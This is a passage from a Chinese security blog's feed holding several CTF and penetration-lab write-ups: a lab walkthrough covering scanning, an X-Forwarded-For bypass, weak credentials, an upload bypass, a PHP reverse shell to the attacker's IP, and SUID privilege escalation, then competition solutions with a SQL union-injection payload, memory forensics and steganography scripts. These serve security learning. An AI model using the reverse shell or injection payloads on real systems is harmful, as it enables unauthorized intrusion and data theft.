&lt;rasd:InstanceID&gt;7&lt;/rasd:InstanceID&gt;        &lt;rasd:Parent&gt;5&lt;/rasd:Parent&gt;        &lt;rasd:ResourceType&gt;17&lt;/rasd:ResourceType&gt;      &lt;/Item&gt;      &lt;Item&gt;        &lt;rasd:AutomaticAllocation&gt;true&lt;/rasd:AutomaticAllocation&gt;        &lt;rasd:Caption&gt;Ethernet adapter on &#39;NAT&#39;&lt;/rasd:Caption&gt;        &lt;rasd:Connection&gt;NAT&lt;/rasd:Connection&gt;        &lt;rasd:ElementName&gt;Ethernet adapter on &#39;NAT&#39;&lt;/rasd:ElementName&gt;        &lt;rasd:InstanceID&gt;8&lt;/rasd:InstanceID&gt;        &lt;rasd:ResourceSubType&gt;E1000&lt;/rasd:ResourceSubType&gt;        &lt;rasd:ResourceType&gt;10&lt;/rasd:ResourceType&gt;      &lt;/Item&gt;    &lt;/VirtualHardwareSection&gt;  &lt;/VirtualSystem&gt;&lt;/Envelope&gt;</code></pre><p>在直接双击ovf文件 使用vmware打开 正常导入就可以了</p><h2 id="渗透靶场"><a href="#渗透靶场" class="headerlink" title="渗透靶场"></a>渗透靶场</h2><h3 id="一、信息搜集"><a href="#一、信息搜集" class="headerlink" title="一、信息搜集"></a>一、信息搜集</h3><p>给的靶机是一个图形化页面的ubuntu 但是貌似打不开终端 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411131700533.png" alt="image-20241113170019100"></p><p>我们还是按照流程一点点来</p><h4 id="扫ip"><a href="#扫ip" class="headerlink" title="扫ip"></a>扫ip</h4><p>nmap扫到靶场ip是192.168.64.140</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411131701170.png" alt="image-20241113170116983"></p><h4 id="扫端口"><a href="#扫端口" class="headerlink" title="扫端口"></a>扫端口</h4><p>继续扫端口</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411131706546.png" alt="image-20241113170624479"></p><h4 id="扫目录"><a href="#扫目录" class="headerlink" title="扫目录"></a>扫目录</h4><p>用whatweb先看一下靶机网站 没有什么特别有用的信息</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411132120196.png" alt="image-20241113212034948"></p><p>下面进行目录扫描</p><pre><code>ython3 ./dirsearch.py -u http://192.168.64.140 -i 200 -w &#39;/home/w3nx1z1/Desktop/dict-master/DirScan/dir.txt&#39; -e ,</code></pre><p>-e参数可以扫描全部文件 不指定某特定后缀名的文件</p><p>扫出administration路由 </p><h3 id="二、访问网站"><a href="#二、访问网站" class="headerlink" title="二、访问网站"></a>二、访问网站</h3><p>我们访问靶场网站</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411132125392.png" alt="image-20241113212512276"></p><p>在访问administration路由 但是是404</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411132128364.png" alt="image-20241113212841270"></p><h4 id="XFF伪造"><a href="#XFF伪造" class="headerlink" title="XFF伪造"></a>XFF伪造</h4><p>尝试使用firefox插件 添加X-Forwarded-For请求头 成功访问登陆页面</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411132130665.png" alt="image-20241113213001560"></p><p>使用弱密码admin:admin登陆后台</p><p><strong><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411132130476.png" alt="image-20241113213036360"></strong></p><p>找到一个文件上传功能</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411132131913.png" alt="image-20241113213118853"></p><h4 id="通过文件上传反弹shell"><a href="#通过文件上传反弹shell" class="headerlink" title="通过文件上传反弹shell"></a>通过文件上传反弹shell</h4><p>基本没怎么ban 先传png文件 在修改后缀名为php即可</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411132304644.png" alt="image-20241113230430522"></p><p>我们这里写反弹shell的php文件如下</p><pre><code class="php">&lt;?php$ip=&quot;192.168.6.160&quot;;$port=8888;$sock = fsockopen($ip, $port);$descriptorspec = array(        0 =&gt; $sock,        1 =&gt; $sock,        2 =&gt; $sock);$process = proc_open(&#39;/bin/sh&#39;, $descriptorspec, $pipes);proc_close($process);?&gt;</code></pre><h3 id="三、进入shell"><a href="#三、进入shell" class="headerlink" title="三、进入shell"></a>三、进入shell</h3><h4 id="切换用户"><a href="#切换用户" class="headerlink" title="切换用户"></a>切换用户</h4><p>先开启一个交互式shell</p><pre><code>python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;</code></pre><p>尝试使用find找一下flag文件 没有找到 找一下home目录 找到一个base64字符串</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411132325716.png" alt="image-20241113232501624"></p><p>解出来是yousef用户的账密</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411132332610.png" alt="image-20241113233209529"></p><p>那直接可以切换用户 进入shell</p><pre><code>ssh yousef@192.168.64.140 </code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411132333909.png" alt="image-20241113233331793"></p><h4 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h4><p>最简单的 找一下suid提权</p><pre><code>find / -perm -u=s -type f 2&gt;/dev/null</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411132334864.png" alt="image-20241113233441741"></p><p>看到su 直接提权就完事了 然后进入到root文件夹下 有个root.txt 读取一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411132337785.png" alt="image-20241113233709693"></p><p>也是base64 解一下 拿到flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202411132337274.png" alt="image-20241113233740126"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 打靶 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024数信杯北区决赛实操</title>
      <link href="/2024/10/03/2024%E6%95%B0%E4%BF%A1%E6%9D%AF%E5%8C%97%E5%8C%BA%E5%86%B3%E8%B5%9B%E5%AE%9E%E6%93%8D/"/>
      <url>/2024/10/03/2024%E6%95%B0%E4%BF%A1%E6%9D%AF%E5%8C%97%E5%8C%BA%E5%86%B3%E8%B5%9B%E5%AE%9E%E6%93%8D/</url>
      
        <content type="html"><![CDATA[<h1 id="2024数信杯北区决赛实操"><a href="#2024数信杯北区决赛实操" class="headerlink" title="2024数信杯北区决赛实操"></a>2024数信杯北区决赛实操</h1><p>本次比赛北区决赛第三名 学生组第一</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202410031225511.png" alt="image-20241003122509200"></p><h2 id="ez-sign"><a href="#ez-sign" class="headerlink" title="ez_sign"></a>ez_sign</h2><p>先爆破出密码123456</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202409301148745.png" alt="img"></p><p>打开看到jpg中的flag1</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202409301147789.png" alt="img"></p><pre><code>flag&#123;266c7354-0817</code></pre><p>流量包中找到flag2</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202409301147791.png" alt="img"></p><pre><code>-4694-9494-</code></pre><p>给了一个part3.zip 无法正常解压 010打开查看 发现有大量FF 写个脚本和0xFF异或</p><pre><code class="python">with open(&quot;part3.zip&quot;, &#39;rb&#39;) as f:    data = f.read()xor_data = bytearray(d ^ 0xFF for d in data)with open(&quot;1.zip&quot;, &#39;wb&#39;) as f:    f.write(xor_data)</code></pre><p>正常解压压缩包 得到flag3</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202409301147954.png" alt="img"></p><pre><code>flag&#123;266c7354-0817-4694-9494-c727479d8f1a&#125; </code></pre><p>其实上面异或这一步直接在010editor里面进行也可以 记得选择无符号字节</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202410031214957.png" alt="image-20241003121454849"></p><p>也可以直接在赛博厨子中进行 先解hex 在进行异或</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202410031216661.png" alt="image-20241003121649531"></p><h2 id="签到寄语"><a href="#签到寄语" class="headerlink" title="签到寄语"></a>签到寄语</h2><p>随便写</p><p>写完用CameraFileCopy扫码 得到文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202410031217996.png" alt="image-20241003121741906"></p><h2 id="Secret1"><a href="#Secret1" class="headerlink" title="Secret1"></a>Secret1</h2><pre><code>小强离开电脑的时候，某人把小强的秘密给偷走了，还把文件修改覆盖了，作案脚本也删了。请帮助小强找到丢失的相关数据。1.提交加密算法工具当中的flag值。（提交示例：flag&#123;*&#125;）</code></pre><p>使用r-studio打开内存镜像 在secret文件夹下面有个pyc文件 保存出来 打开就有flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202410031218110.png" alt="image-20241003121804041"></p><h2 id="secret2"><a href="#secret2" class="headerlink" title="secret2"></a>secret2</h2><pre><code>2.恢复图片中的flag值</code></pre><p>把上面的pyc文件代码逆出来</p><pre><code class="Python">def encode(png):    flag = &quot;flag&#123;eba771fd-2b03-418f-b11a-60f1141c99ee&#125;&quot;    lens = len(flag)    with open(png, &quot;rb&quot;) as f:        pic_bytes = f.read()        print(len(pic_bytes))        output_bytes = bytearray()        for i in range(0, len(pic_bytes)):            output_bytes.append(pic_bytes[i] ^ ord(flag[i * 2 % lens]))    with open(png, &quot;wb&quot;) as f:        f.write(output_bytes)</code></pre><p>filescan出来一个flag.png 保存出来 这就是被加密的图片 ai跑个脚本恢复出原图片</p><pre><code class="Python">def decode(png):    flag = &quot;flag&#123;eba771fd-2b03-418f-b11a-60f1141c99ee&#125;&quot;    lens = len(flag)    with open(png, &quot;rb&quot;) as f:        enc_bytes = f.read()        output_bytes = bytearray()        for i in range(len(enc_bytes)):            output_bytes.append(enc_bytes[i] ^ ord(flag[i * 2 % lens]))    with open(&quot;decoded_&quot; + png, &quot;wb&quot;) as f:        f.write(output_bytes)# 使用解密函数decode(&quot;flag.png&quot;)</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202410031219969.png" alt="image-20241003121948915"></p><h2 id="secret3-赛后复盘"><a href="#secret3-赛后复盘" class="headerlink" title="secret3(赛后复盘)"></a>secret3(赛后复盘)</h2><pre><code>3.提交压缩包当中的flag值。</code></pre><p>也算是学到了 一个很不常见的插件使用方式</p><p>压缩包在上一题恢复出来的图片尾部 提取出来之后 确定为真加密 开始找密码</p><p>密码在剪切板中</p><p>剪贴板插件后面加上-v参数 因为可能在明文之间有不可见字符进行隔断 这个时候仅使用clipboard就可能看不到全部明文</p><pre><code>clipboard -v </code></pre><p>下图是加不加-v参数的对比</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202410031257569.png" alt="image-20241003125734777"></p><p>拿到密码后 解压压缩包出flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202410031258260.png" alt="image-20241003125808201"></p><h2 id="history1"><a href="#history1" class="headerlink" title="history1"></a>history1</h2><p>r-studio里面找到两个ipynb文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202410031220754.png" alt="image-20241003122015611"></p><p>使用vol导出</p><pre><code class="Python">.\volatility.exe -f F:\history\history_91c3e27c00d70d4d6982952b60a4bb51\data.raw --profile=Win7SP1x64 filescan | findstr &quot;.ipynb&quot;                                             ─╯Volatility Foundation Volatility Framework 2.60x000000007d843bd0     16      0 -W-rw- \Device\HarddiskVolume1\Users\ctf\Anaconda3\etc\fish\conda\.ipynb_checkpoints\Untitled-checkpoint.ipynb0x000000007da54b40     16      0 R--rw- \Device\HarddiskVolume1\Users\ctf\Anaconda3\etc\fish\conda\Untitled.ipynb.\volatility.exe -f F:\history\history_91c3e27c00d70d4d6982952b60a4bb51\data.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000007d843bd0 -D E:\Desktop\数信杯\history            ─╯Volatility Foundation Volatility Framework 2.6DataSectionObject 0x7d843bd0   None   \Device\HarddiskVolume1\Users\ctf\Anaconda3\etc\fish\conda\.ipynb_checkpoints\Untitled-checkpoint.ipynb.\volatility.exe -f F:\history\history_91c3e27c00d70d4d6982952b60a4bb51\data.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000007da54b40 -D E:\Desktop\数信杯\history            ─╯Volatility Foundation Volatility Framework 2.6DataSectionObject 0x7da54b40   None   \Device\HarddiskVolume1\Users\ctf\Anaconda3\etc\fish\conda\Untitled.ipynb</code></pre><p>打开就是flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202409301147598.png" alt="img"></p><h2 id="history2"><a href="#history2" class="headerlink" title="history2"></a>history2</h2><p>同上题</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202409301147581.png" alt="img"></p><h2 id="Pixel"><a href="#Pixel" class="headerlink" title="Pixel"></a>Pixel</h2><p>首先看到文件头提示SM4CBC sm4国密算法 CBC模式 修改为png头后 正常打开图片</p><p>尾部有密文</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202410031220259.png" alt="image-20241003122040190"></p><p>存在lsb隐写 先得到key</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202410031221907.png" alt="image-20241003122100826"></p><p>注意这个地方是<code>1</code>不是<code>l</code>(踩大坑)</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202410031222166.png" alt="image-20241003122224057"></p><p>zsteg得到iv</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202410031223312.png" alt="image-20241003122314206"></p><p>直接解密</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202410031223650.png" alt="image-20241003122337452"></p><h2 id="水印攻击-北区-990分"><a href="#水印攻击-北区-990分" class="headerlink" title="水印攻击_北区(990分)"></a>水印攻击_北区(990分)</h2><p>gpt调</p><pre><code class="Python">from PIL import Image, ImageEnhanceimport numpy as np# 打开原始图片image_path = &quot;input.png&quot;image = Image.open(image_path)# 1. 轻微调整亮度def adjust_brightness(image, factor=1.05):    enhancer = ImageEnhance.Brightness(image)    return enhancer.enhance(factor)# 2. 添加轻微的高斯噪声def add_noise(image, mean=0, var=0.001):    img_array = np.asarray(image)    row, col, ch = img_array.shape    sigma = 0.0003    gauss = np.random.normal(mean, sigma, (row, col, ch))    noisy_img = img_array + gauss * 255    noisy_img = np.clip(noisy_img, 0, 255).astype(np.uint8)    return Image.fromarray(noisy_img)# 3. 叠加轻微的掩码块def add_mask_block(image, block_size=5, opacity=0.1):    img_array = np.array(image)    mask = np.zeros_like(img_array)    h, w, _ = img_array.shape    start_h = np.random.randint(0, h - block_size)    start_w = np.random.randint(0, w - block_size)    mask[start_h:start_h + block_size, start_w:start_w + block_size] = (255, 255, 255)    final_img = (1 - opacity) * img_array + opacity * mask    final_img = np.clip(final_img, 0, 255).astype(np.uint8)    return Image.fromarray(final_img)# 应用以上步骤对图像进行处理image = adjust_brightness(image, factor=1.1) # 轻微提高亮度image = add_noise(image, mean=0, var=0.0005)  # 添加轻微噪声# 保存处理后的图片image.save(&quot;result.png&quot;)</code></pre><h2 id="Ezsql"><a href="#Ezsql" class="headerlink" title="Ezsql"></a>Ezsql</h2><p>联合注入 先闭合前面的sql查询语句 后面根据题目描述 查询whatisthis表中的flag</p><pre><code class="Python">name=1&#39;) union all select 1,flag,3 FROM whatisthis--+</code></pre><h2 id="easy-decode"><a href="#easy-decode" class="headerlink" title="easy-decode"></a>easy-decode</h2><p>对main函数计算md5，动调有问题，不同工具结果都不同，比较新颖的反调试</p><p>idapython直接算</p><pre><code class="Python">import hashlibimport ida_bytes# 指定的起始地址（替换为有效的起始地址）start_addr = 0x7FF721E11000# 要读取的长度length = 0x7D0# 读取字节数据byte_values = [ida_bytes.get_byte(start_addr + i) for i in range(length)]# 将字节数组转换为字节串（bytes）byte_data = bytes(byte_values)# 计算MD5哈希值md5_hash = hashlib.md5(byteS_data).hexdigest()# 打印MD5哈希值print(&quot;MD5:&quot;, md5_hash)</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202410031224720.png" alt="image-20241003122429607"></p><p>厨子解aes，iv全零</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202409301147392.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> web </tag>
            
            <tag> re </tag>
            
            <tag> forensics </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024羊城杯MISC方向wp</title>
      <link href="/2024/08/28/2024%E7%BE%8A%E5%9F%8E%E6%9D%AFMISC%E6%96%B9%E5%90%91wp/"/>
      <url>/2024/08/28/2024%E7%BE%8A%E5%9F%8E%E6%9D%AFMISC%E6%96%B9%E5%90%91wp/</url>
      
        <content type="html"><![CDATA[<h1 id="2024羊城杯MISC方向wp"><a href="#2024羊城杯MISC方向wp" class="headerlink" title="2024羊城杯MISC方向wp"></a>2024羊城杯MISC方向wp</h1><p>真是叹为观止的一场比赛 见识到众多本科组ctf大手子们熬夜上分 最后半小时神仙打架 最后一分钟疯狂交题更是让在下大开眼界 </p><p>但是苦于没有队友 只能自己浅做一下</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281606294.png" alt="image-20240828160658179"></p><h2 id="不一样的数据库-2"><a href="#不一样的数据库-2" class="headerlink" title="不一样的数据库_2"></a>不一样的数据库_2</h2><p>附件拿到一个压缩包 真加密 010打开 翻到最下面 找到提示 密码是6位数字</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281609396.png" alt="image-20240828160902327"></p><p>爆破一下密码 为<code>753951</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281609493.png" alt="image-20240828160930428"></p><p>解压得到一张残缺的二维码和一个kdbx的Keepass数据库 先修复二维码 这个很好弄 就是补全三个定位点就可以了</p><p>直接截一个正常二维码的定位点 然后用PS粘上去就可以扫</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281617426.png" alt="image-20240828161721363"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281618936.png" alt="image-20240828161820866"></p><p>得到<code>NRF@WQUKTQ12345&amp;WWWF@WWWFX#WWQXNWXNU</code></p><p>使用Keepass打开数据库 需要输入密码 但是发现直接输入上面扫出来的字符串不能直接解密 发现给的附件中的残缺二维码的名字是13 联想到rot13 解密一下得到<code>AES@JDHXGD12345&amp;JJJS@JJJSK#JJDKAJKAH</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281628267.png" alt="image-20240828162807192"></p><p>成功打开数据库</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281628359.png" alt="image-20240828162847235"></p><p>先看到一个<code>passisDASCTF</code>  同时看到群组名字是AES 那下面就是找一下密文 </p><h3 id="查看编辑记录"><a href="#查看编辑记录" class="headerlink" title="查看编辑记录"></a>查看编辑记录</h3><p>右击选择编辑记录 可以找到修改密码记录的历史 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281636863.png" alt="image-20240828163642789"></p><p>选择最后面两条记录的任意一条 选择<code>高级</code> 可以看到一个字段名为<code>aes</code>就是密文 值有很明显的<code>U2Fsd</code>AES加密头 直接使用密码进行AES解密</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281638684.png" alt="image-20240828163849623"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281640368.png" alt="image-20240828164012316"></p><h2 id="so-much"><a href="#so-much" class="headerlink" title="so+much"></a>so+much</h2><p>原题 没什么好说的 拿到的ad1镜像文件 名字为<code>c2hpZnQh</code>  解base64是<code>shift! </code></p><p>使用010打开 发现有提示 和<code>123456</code> 结合shift 可以想到密码是按住shift键的123456 也就是<code>!@#$%^</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281641657.png" alt="image-20240828164137592"></p><p>解密ad1镜像文件 使用FTK imager  File——Decrypt AD1 image 得到解密后的<code>c2hpZnQh-decrypted.ad1</code> 在使用FTK进行挂载</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281656295.png" alt="image-20240828165614222"></p><p>打开挂载上的镜像 发现很多<code>.crypto</code>文件 同时时间戳只有两种 猜测是转二进制 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281658327.png" alt="image-20240828165833261"></p><p>因为挂载的时候是只读模式 我们需要把这些文件都先单独复制出来 写脚本 先提取时间戳 可以发现时间少的是<code>1628151585.73009</code> 因此转化为0 反之则为1</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281700567.png" alt="image-20240828170014520"></p><pre><code class="python">import oslist = [&#39;&#39;]*344i = 0for j in range(344):    list[j] = os.path.getmtime(str(j)+&#39;.crypto&#39;)# print(list)flag = &#39;&#39;for i in range(344):    if(str(list[i]) == &#39;1628151585.73009&#39;):        flag += &#39;0&#39;    else:        flag += &#39;1&#39;print(flag)tmp = &#39;&#39;for k in range(len(flag)):    tmp += flag[k]    if len(tmp) == 8:        print(chr(int(tmp,2)),end=&#39;&#39;)        tmp = &#39;&#39;        # the_key_is_700229c053b4ebbcf1a3cc37c389c4fa</code></pre><p>得到解密crypto文件的密码是<code>700229c053b4ebbcf1a3cc37c389c4fa</code>  解密需要的工具是<code>Encrypto </code> 我们只需要找两个时间戳不一样的文件进行解密就可以了  两个文件内容拼起来就是flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281703623.png" alt="image-20240828170309574"></p><h2 id="hiden"><a href="#hiden" class="headerlink" title="hiden"></a>hiden</h2><p>附件一个wav文件 一个需要解密内容的文件 文件名<code>60=()+()</code> 直接猜测是13+47 需要进行rot47+rot13解密</p><p>得到加密脚本</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281706170.png" alt="image-20240828170653049"></p><pre><code class="python">import wave with open(&#39;flag.txt&#39;, &#39;rb&#39;) as f:    txt_data = f.read()    file_len = len(txt_data)    txt_data = file_len.to_bytes(3, byteorder = &#39;little&#39;) + txt_datawith wave.open(&quot;test.wav&quot;, &quot;rb&quot;) as f:    attrib = f.getparams()        wav_data = bytearray( f.readframes(-1) )for index in range(len(txt_data)):    wav_data[index * 4] = txt_data[index]    with wave.open(&quot;hiden.wav&quot;, &quot;wb&quot;) as f:    f.setparams(attrib)     f.writeframes(wav_data)</code></pre><p>直接ai跑个解密脚本 就能提取出flag.txt的内容</p><pre><code class="python">import wave# 打开hiden.wav文件with wave.open(&quot;hiden.wav&quot;, &quot;rb&quot;) as f:    # 获取音频参数    num_frames = f.getnframes()    wav_data = bytearray(f.readframes(num_frames))# 提取隐藏的内容hidden_data = bytearray()length_of_hidden_data = 0# 先提取长度for index in range(3):    hidden_data.append(wav_data[index * 4])# 得到隐藏数据的长度length_of_hidden_data = int.from_bytes(hidden_data[:3], byteorder=&#39;little&#39;)# 提取隐藏的文本数据hidden_data = bytearray()for index in range(length_of_hidden_data):    hidden_data.append(wav_data[(index + 3) * 4])  # 继续提取，跳过长度的部分# 将提取的内容写入flag.txtwith open(&#39;extracted_flag.txt&#39;, &#39;wb&#39;) as f:    f.write(hidden_data)</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281708578.png" alt="image-20240828170805516"></p><h2 id="Checkin"><a href="#Checkin" class="headerlink" title="Checkin"></a>Checkin</h2><p>在附件压缩包中找到一条注释</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281721518.png" alt="image-20240828172100396"></p><p>解一下 是base58 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281721503.png" alt="image-20240828172140427"></p><p>只给了一个txt文件 是16进制 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281717828.png" alt="image-20240828171746771"></p><p>放到010中 发现是一个流量包 单独保存出来进行分析 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281718443.png" alt="image-20240828171843381"></p><p>很多TLS 找办法找到解密日志 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281719729.png" alt="image-20240828171934648"></p><p>txt文档中存在wbstego隐写 密码就使用上面注释解出来的 导出来的文件保存为<code>1.log</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281727476.png" alt="image-20240828172703379"></p><p>将这个解密日志 导入到流量包中</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281732672.png" alt="image-20240828173249610"></p><p>成功解密 追踪http流 找到一个flag.gif </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281733626.png" alt="image-20240828173356544"></p><p>提取出来 先分析一波帧间隔 很好 有规律 也是转二进制 小的是0 大的是1</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281734852.png" alt="image-20240828173432763"></p><p>解一下二进制 出flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408281734768.png" alt="image-20240828173458686"></p><h2 id="miaoro"><a href="#miaoro" class="headerlink" title="miaoro"></a>miaoro</h2><p>给到的附件是一个流量包 先追踪一下tcp流 </p><p>可以看到请求包GWHT字段是一个base64加密的值 在下面的返回包 也是base64加密的值 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408282034434.png" alt="image-20240828203403305"></p><p>解密看一下 可以看到GWHT部分应该是命令执行的部分 下面返回包就是命令执行的结果 出现命令执行部分也对应着题干中的被攻击</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408282035954.png" alt="image-20240828203510872"></p><p>继续向后看 在第10个包找到一个密码<code>Th15_11111111s_pP@sssssw000rd!!!</code>    在第13个包找到一个<code>secret.txt</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408282037589.png" alt="image-20240828203700485"></p><p>将secret.txt的返回包部分提取出来 是一个逆序的压缩包的16进制 进行操作之后将压缩包保存下来 使用上面找到的密码进行解压</p><p>得到一个flag2.jpg</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408282039462.png" alt="image-20240828203941411"></p><p>看起来很奇怪 猜测是宽高问题 尝试爆破crc无果 将宽高对调 并适当增加对调后的高度 恢复出正常的图片</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408282041359.jpg" alt="flag2"></p><p>在网上找到对应的解码对照表</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408282042863.png" alt="image-20240828204239767"></p><p>得到flag2：EBOFDELQDIAA}</p><p>再次结合题干说的被工具攻击 来分析一下请求包中的Cookie 使用shiro反序列化解密工具 可以在第二个cookie中解出flag1</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202408282046376.png" alt="image-20240828204626281"></p><p>拼起来就是</p><pre><code>DASCTF&#123;B916CFEB-C40F-45D6-A7BC-EBOFDELQDIAA&#125;</code></pre><h2 id="1z-misc"><a href="#1z-misc" class="headerlink" title="1z_misc"></a>1z_misc</h2><p>挺无语的一道misc 只能说很有misc风格 纯纯猜谜+缝合 前部分就是结合星宿 猜压缩包解压密码 是<code>E@SI1Y!</code></p><p>解出来之后是一张<code>天琴座</code>图片和一个flag 就是2024ISCC的有人让我给你带个话这个题 难点在于工具的安装</p><p>下面放两篇文章 就不赘述了</p><pre><code>https://blog.csdn.net/qq_36959443/article/details/116136965</code></pre><pre><code>https://blog.csdn.net/administratorlws/article/details/139154964?ops_request_misc=%257B%2522request%255Fid%2522%253A%252239915FCB-333C-46C6-879E-240F264B325F%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=39915FCB-333C-46C6-879E-240F264B325F&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-2-139154964-null-null.142^v100^pc_search_result_base4&amp;utm_term=iscc%20%E6%9C%89%E4%BA%BA%E8%AE%A9%E6%88%91%E7%BB%99%E4%BD%A0%E5%B8%A6%E4%B8%AA%E8%AF%9D&amp;spm=1018.2226.3001.4187</code></pre>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024ISG观安杯</title>
      <link href="/2024/08/20/2024ISG%E8%A7%82%E5%AE%89%E6%9D%AF/"/>
      <url>/2024/08/20/2024ISG%E8%A7%82%E5%AE%89%E6%9D%AF/</url>
      
